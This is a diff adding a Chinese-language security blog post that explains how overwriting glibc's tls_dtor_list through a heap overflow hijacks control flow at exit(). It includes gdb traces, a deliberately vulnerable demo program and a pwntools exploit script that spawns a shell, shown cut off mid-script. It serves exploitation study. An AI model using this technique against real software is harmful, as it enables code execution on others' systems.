@@ -1,0 +1,861 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="tls_dtor_list,heap overflow," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="Preview记得以前刷pwn题的时候有碰到覆盖tls_dtor_list的技术，那时候不是很懂，所以也没有去仔细研究(还有技术太渣…..)。最近比较闲，所以就打算把这个老问题拿出来彻底解决一下。 tls_dtor_list首先弄明白tls_dtor_list是什么。tls_dtor_list是一个指针，声明如下：">
+<meta name="keywords" content="tls_dtor_list,heap overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Playing with tls_dtor_list">
+<meta property="og:url" content="http://yoursite.com/2017/03/27/Playing-with-tls-dtor-list/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="Preview记得以前刷pwn题的时候有碰到覆盖tls_dtor_list的技术，那时候不是很懂，所以也没有去仔细研究(还有技术太渣…..)。最近比较闲，所以就打算把这个老问题拿出来彻底解决一下。 tls_dtor_list首先弄明白tls_dtor_list是什么。tls_dtor_list是一个指针，声明如下：">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Playing with tls_dtor_list">
+<meta name="twitter:description" content="Preview记得以前刷pwn题的时候有碰到覆盖tls_dtor_list的技术，那时候不是很懂，所以也没有去仔细研究(还有技术太渣…..)。最近比较闲，所以就打算把这个老问题拿出来彻底解决一下。 tls_dtor_list首先弄明白tls_dtor_list是什么。tls_dtor_list是一个指针，声明如下：">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/03/27/Playing-with-tls-dtor-list/"/>
+
+
+  <title> Playing with tls_dtor_list | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Playing with tls_dtor_list
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2017-03-27T01:03:47+08:00" content="2017-03-27">
+              2017-03-27
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/heap-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">heap_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/03/27/Playing-with-tls-dtor-list/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/27/Playing-with-tls-dtor-list/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Preview"><a href="#Preview" class="headerlink" title="Preview"></a>Preview</h2><p>记得以前刷pwn题的时候有碰到覆盖tls_dtor_list的技术，那时候不是很懂，所以也没有去仔细研究(还有技术太渣…..)。最近比较闲，所以就打算把这个老问题拿出来彻底解决一下。</p>
+<h2 id="tls-dtor-list"><a href="#tls-dtor-list" class="headerlink" title="tls_dtor_list"></a>tls_dtor_list</h2><p>首先弄明白tls_dtor_list是什么。<br>tls_dtor_list是一个指针，声明如下：<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="keyword">void</span> *)</span></span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></div><div class="line">&#123;</div><div class="line">  dtor_func func;</div><div class="line">  <span class="keyword">void</span> *obj;</div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></div></pre></td></tr></table></figure></p>
+<p>dtor_list结构中func是一个带有obj参数的函数，map是跟动态链接有关的结构体，next指向下一个dtor_list结构体。<br>其实关键还得看这个结构体是干什么用的。一般来说程序在结束时总会执行exit()函数，就算是main函数没有显示调用exit()函数，在main函数返回后程序还是会执行exit()函数。而exit()函数最终会执行下面的__call_tls_dtors()函数，此函数会依次执行dtor_list链表中的每个节点里的func函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span></div><div class="line">__call_tls_dtors (<span class="keyword">void</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">while</span> (tls_dtor_list)</div><div class="line">    &#123;</div><div class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> = <span class="title">tls_dtor_list</span>;</span></div><div class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</div><div class="line"></div><div class="line">      cur-&gt;func (cur-&gt;obj);</div><div class="line"></div><div class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</div><div class="line"></div><div class="line">      <span class="comment">/* Allow DSO unload if count drops to zero.  */</span></div><div class="line">      cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count--;</div><div class="line">      <span class="keyword">if</span> (cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count == <span class="number">0</span> &amp;&amp; cur-&gt;<span class="built_in">map</span>-&gt;l_type == lt_loaded)</div><div class="line">        cur-&gt;<span class="built_in">map</span>-&gt;l_flags_1 &amp;= ~DF_1_NODELETE;</div><div class="line"></div><div class="line">      __rtld_lock_unlock_recursive (GL(dl_load_lock));</div><div class="line"></div><div class="line">      <span class="built_in">free</span> (cur);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>为了一探究竟，我们来跟踪一下exit()函数。<br>首先main函数执行完后返回到__libc_start_main()函数中，接着会执行__GI_exit()函数：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">   0x7ffff7a36f3b &lt;__libc_start_main+235&gt;:	mov    rdx,QWORD PTR [rax]</div><div class="line">   0x7ffff7a36f3e &lt;__libc_start_main+238&gt;:	mov    rax,QWORD PTR [rsp+0x18]</div><div class="line">   0x7ffff7a36f43 &lt;__libc_start_main+243&gt;:	call   rax  /*address of main*/</div><div class="line">=&gt; 0x7ffff7a36f45 &lt;__libc_start_main+245&gt;:	mov    edi,eax</div><div class="line">   0x7ffff7a36f47 &lt;__libc_start_main+247&gt;:	call   0x7ffff7a511e0 &lt;__GI_exit&gt;</div><div class="line">   0x7ffff7a36f4c &lt;__libc_start_main+252&gt;:	xor    edx,edx</div><div class="line">   0x7ffff7a36f4e &lt;__libc_start_main+254&gt;:	jmp    0x7ffff7a36e89 &lt;__libc_start_main+57&gt;</div><div class="line">   0x7ffff7a36f53 &lt;__libc_start_main+259&gt;:	</div><div class="line">    mov    rax,QWORD PTR [rip+0x3a20f6]        # 0x7ffff7dd9050 &lt;__libc_pthread_functions+400&gt;</div></pre></td></tr></table></figure></p>
+<p>我们接着跟进去：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">   0x7ffff7a511cb &lt;__run_exit_handlers+251&gt;:	call   0x7ffff7a344f0 &lt;free@plt+48&gt;</div><div class="line">   0x7ffff7a511d0 &lt;__run_exit_handlers+256&gt;:	jmp    0x7ffff7a510e7 &lt;__run_exit_handlers+23&gt;</div><div class="line">   0x7ffff7a511d5:	data32 nop WORD PTR cs:[rax+rax*1+0x0]</div><div class="line">=&gt; 0x7ffff7a511e0 &lt;__GI_exit&gt;:	lea    rsi,[rip+0x3824e1]        # 0x7ffff7dd36c8 &lt;__exit_funcs&gt;</div><div class="line">   0x7ffff7a511e7 &lt;__GI_exit+7&gt;:	sub    rsp,0x8</div><div class="line">   0x7ffff7a511eb &lt;__GI_exit+11&gt;:	mov    edx,0x1</div><div class="line">   0x7ffff7a511f0 &lt;__GI_exit+16&gt;:	call   0x7ffff7a510d0 &lt;__run_exit_handlers&gt;</div><div class="line">   0x7ffff7a511f5:	nop    WORD PTR cs:[rax+rax*1+0x0]</div></pre></td></tr></table></figure></p>
+<p>由上面的指令可知，__GI_exit()函数然后会调用__run_exit_handlers()函数，我们再跟进去：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">   0x7ffff7a510d4 &lt;__run_exit_handlers+4&gt;:	mov    r12d,edx</div><div class="line">   0x7ffff7a510d7 &lt;__run_exit_handlers+7&gt;:	push   rbp</div><div class="line">   0x7ffff7a510d8 &lt;__run_exit_handlers+8&gt;:	mov    rbp,rsi</div><div class="line">=&gt; 0x7ffff7a510db &lt;__run_exit_handlers+11&gt;:	push   rbx</div><div class="line">   0x7ffff7a510dc &lt;__run_exit_handlers+12&gt;:	mov    ebx,edi</div><div class="line">   0x7ffff7a510de &lt;__run_exit_handlers+14&gt;:	sub    rsp,0x8</div><div class="line">   0x7ffff7a510e2 &lt;__run_exit_handlers+18&gt;:	call   0x7ffff7a517b0 &lt;__GI___call_tls_dtors&gt;</div><div class="line">   0x7ffff7a510e7 &lt;__run_exit_handlers+23&gt;:	mov    r13,QWORD PTR [rbp+0x0]</div></pre></td></tr></table></figure></p>
+<p>这时我们看到了我们得目标函数__GI___call_tls_dtors()，我们跟进去研究一下其汇编代码，然后可以找到tls_dtor_list指针的地址。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> x/30i __GI___call_tls_dtors</div><div class="line">=&gt; 0x7ffff7a517b0 &lt;__GI___call_tls_dtors&gt;:	    push   r12</div><div class="line">   0x7ffff7a517b2 &lt;__GI___call_tls_dtors+2&gt;:	push   rbp</div><div class="line">   0x7ffff7a517b3 &lt;__GI___call_tls_dtors+3&gt;:	push   rbx</div><div class="line">   0x7ffff7a517b4 &lt;__GI___call_tls_dtors+4&gt;:	lea    rdi,[rip+0x3815d5]        # 0x7ffff7dd2d90</div><div class="line">   0x7ffff7a517bb &lt;__GI___call_tls_dtors+11&gt;:	call   0x7ffff7a344a0 &lt;_dl_find_dso_for_object@plt&gt;</div><div class="line">   0x7ffff7a517c0 &lt;__GI___call_tls_dtors+16&gt;:	mov    rbx,QWORD PTR [rax+0x60]  /*point*/</div><div class="line">   0x7ffff7a517c7 &lt;__GI___call_tls_dtors+23&gt;:	test   rbx,rbx</div><div class="line">   0x7ffff7a517ca &lt;__GI___call_tls_dtors+26&gt;:	je     0x7ffff7a51868 &lt;__GI___call_tls_dtors+184&gt;</div><div class="line">   0x7ffff7a517d0 &lt;__GI___call_tls_dtors+32&gt;:	mov    rbp,QWORD PTR [rip+0x381611]        # 0x7ffff7dd2de8</div><div class="line">   0x7ffff7a517d7 &lt;__GI___call_tls_dtors+39&gt;:	lea    r12,[rbp+0x908]</div><div class="line">   0x7ffff7a517de &lt;__GI___call_tls_dtors+46&gt;:	jmp    0x7ffff7a51809 &lt;__GI___call_tls_dtors+89&gt;</div><div class="line">   0x7ffff7a517e0 &lt;__GI___call_tls_dtors+48&gt;:	mov    rdi,r12</div><div class="line">   0x7ffff7a517e3 &lt;__GI___call_tls_dtors+51&gt;:	call   QWORD PTR [rbp+0xf10]</div><div class="line">   0x7ffff7a517e9 &lt;__GI___call_tls_dtors+57&gt;:	mov    rdi,rbx</div><div class="line">   0x7ffff7a517ec &lt;__GI___call_tls_dtors+60&gt;:	call   0x7ffff7a344f0 &lt;free@plt+48&gt;</div><div class="line">   0x7ffff7a517f1 &lt;__GI___call_tls_dtors+65&gt;:	lea    rdi,[rip+0x381598]        # 0x7ffff7dd2d90</div><div class="line">   0x7ffff7a517f8 &lt;__GI___call_tls_dtors+72&gt;:	call   0x7ffff7a344a0 &lt;_dl_find_dso_for_object@plt&gt;</div><div class="line">   0x7ffff7a517fd &lt;__GI___call_tls_dtors+77&gt;:	mov    rbx,QWORD PTR [rax+0x60]</div><div class="line">   0x7ffff7a51804 &lt;__GI___call_tls_dtors+84&gt;:	test   rbx,rbx</div><div class="line">   ......</div></pre></td></tr></table></figure></p>
+<p>根据源代码对比可知，我们可以知道tls_dtor_list的存储地址了——rax+0x60。需要注意的是一般情况下这个指针的值是NULL。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> p/x $rax+0x60</div><div class="line"><span class="meta">$</span>5 = 0x7ffff7fdf6f0</div><div class="line"><span class="meta">gdb-peda$</span> p/x *($rax+0x60)</div><div class="line"><span class="meta">$</span>6 = 0x0</div></pre></td></tr></table></figure></p>
+<p>接下来我们要做的事覆盖tls_dtor_list这个指针来执行我们的控制流。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>关键是我们怎么来覆盖这个指针，我想为什么这技术用的少是由原因的——因为比较难覆盖。我们先来看一下我们实验程序的内存分布情况。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> vmmap</div><div class="line">Start              End                Perm	Name</div><div class="line">0x00400000         0x00401000         r-xp	/home/w0lfzhang/Desktop/a.out</div><div class="line">0x00600000         0x00601000         r--p	/home/w0lfzhang/Desktop/a.out</div><div class="line">0x00601000         0x00602000         rw-p	/home/w0lfzhang/Desktop/a.out</div><div class="line">0x00007ffff7a15000 0x00007ffff7bcf000 r-xp	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7bcf000 0x00007ffff7dcf000 ---p	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7dcf000 0x00007ffff7dd3000 r--p	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7dd3000 0x00007ffff7dd5000 rw-p	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7dd5000 0x00007ffff7dda000 rw-p	mapped</div><div class="line">0x00007ffff7dda000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.19.so</div><div class="line">0x00007ffff7fdf000 0x00007ffff7fe2000 rw-p	mapped  /*located on this memory area*/</div><div class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 rw-p	mapped</div><div class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]</div><div class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.19.so</div><div class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.19.so</div><div class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped</div><div class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]</div><div class="line">0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]</div></pre></td></tr></table></figure></p>
+<p>对比一下就知道，这个指针的位置在vdso前的map区域，其实就是线程局部存储tls所在的内存页。要想覆盖tls_dtor_list，难度是比较大的。但是也不是没办法，这时我们就要来研究堆的分配了。</p>
+<h3 id="malloc-Huge-Chunk"><a href="#malloc-Huge-Chunk" class="headerlink" title="malloc Huge Chunk"></a>malloc Huge Chunk</h3><p>当申请的堆块大到不足以在heap segment满足时，glibc会把堆块分配到map区域。<br>我们来验证一下。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</div><div class="line">  <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"address: %p\n"</span>, a);</div><div class="line">  read(<span class="number">0</span>, a, <span class="number">0x111111</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>我在程序中malloc(0x100000)，(具体数值不一定要0x100000，只要足够大就可以)然后输出其地址，接着看一下内存布局和tls_dtor_list的地址。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> ni</div><div class="line">address: 0x7ffff7ede010</div><div class="line"><span class="meta"></span></div><div class="line">gdb-peda$ p/x $rax+0x60  /*address of tls_dtor_list*/</div><div class="line"><span class="meta">$</span>1 = 0x7ffff7fdf6f0</div><div class="line"><span class="meta"></span></div><div class="line">gdb-peda$ vmmap</div><div class="line">Start              End                Perm	Name</div><div class="line">0x00400000         0x00401000         r-xp	/home/w0lfzhang/Desktop/tls</div><div class="line">0x00600000         0x00601000         r--p	/home/w0lfzhang/Desktop/tls</div><div class="line">0x00601000         0x00602000         rw-p	/home/w0lfzhang/Desktop/tls</div><div class="line">0x00007ffff7a15000 0x00007ffff7bcf000 r-xp	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7bcf000 0x00007ffff7dcf000 ---p	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7dcf000 0x00007ffff7dd3000 r--p	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7dd3000 0x00007ffff7dd5000 rw-p	/lib/x86_64-linux-gnu/libc-2.19.so</div><div class="line">0x00007ffff7dd5000 0x00007ffff7dda000 rw-p	mapped</div><div class="line">0x00007ffff7dda000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.19.so</div><div class="line">0x00007ffff7ede000 0x00007ffff7fe2000 rw-p	mapped</div><div class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 rw-p	mapped</div><div class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]</div><div class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.19.so</div><div class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.19.so</div><div class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped</div><div class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]</div><div class="line">0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]</div></pre></td></tr></table></figure></p>
+<p>哈哈，glibc把堆块分配到了线程局部存储所在的页之前了。我们计算一下tls_dtor_list指针离堆块尾有多远。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x7ffff7fdf6f0 - (0x7ffff7ede010 + 0x100000) = 0x16E0</div></pre></td></tr></table></figure></p>
+<p>还好距离不是很远…这样就好办了，如果有堆溢出的话，那我们通过覆盖tls_dtor_list指针和伪造一批dtor_list结构体，我们几乎可以干任何事情。</p>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>我就简单用上面的例子来得到一个shell。虽然平时不会有这种简单的情况，但是引申一下就行了：如果程序会给你一个malloc(len)的选项，(len由用户输入)，而且读入内容部分能造成堆溢出的话，就和这种情况差不多了。<br>因为主要是要找到tls_dtor_list的地址，而又因为ASLR的影响，其地址在不断变化。所以关键是bypass ASLR，一般方法就只能爆破了。但是只是演示作用，所以我就关了ASLR。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">libc_base_addr = <span class="number">0x7ffff7a15000</span></div><div class="line">system_addr = libc_base_addr + <span class="number">0x46590</span></div><div class="line">puts_addr = libc_base_addr + <span class="number">0x6fd60</span></div><div class="line">binsh_addr = libc_base_addr + <span class="number">0x17c8c3</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./tls'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"address: "</span>)</div><div class="line">r = p.recvuntil(<span class="string">"\n"</span>)</div><div class="line">mapped_addr = int(r, <span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"[*]mapped_addr: "</span> + hex(mapped_addr)</div><div class="line"></div><div class="line"><span class="comment"># let's make fake two tls_dtor, one for printing a message--puts('/bin/sh')</span></div><div class="line"><span class="comment"># the other for execute system('/bin/sh')</span></div><div class="line"><span class="comment"># fake tls_dtor1</span></div><div class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(puts_addr) + p64(binsh_addr) + p64(mapped_addr + <span class="number">0x100</span>) + p64(mapped_addr + <span class="number">0x40</span>)</div><div class="line"></div><div class="line"><span class="comment"># fake tls_dtor2</span></div><div class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(system_addr) + p64(binsh_addr) + p64(mapped_addr + <span class="number">0x100</span>) + p64(<span class="number">0</span>)</div><div class="line"></div><div class="line">payload += <span class="string">'a'</span> * (<span class="number">0x100000</span> - <span class="number">0x60</span> + <span class="number">0x16E0</span>) + p64(mapped_addr + <span class="number">0x10</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("go?")</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"pwning...."</span></div><div class="line"><span class="keyword">print</span> <span class="string">"Got a shell!"</span></div><div class="line">sleep(<span 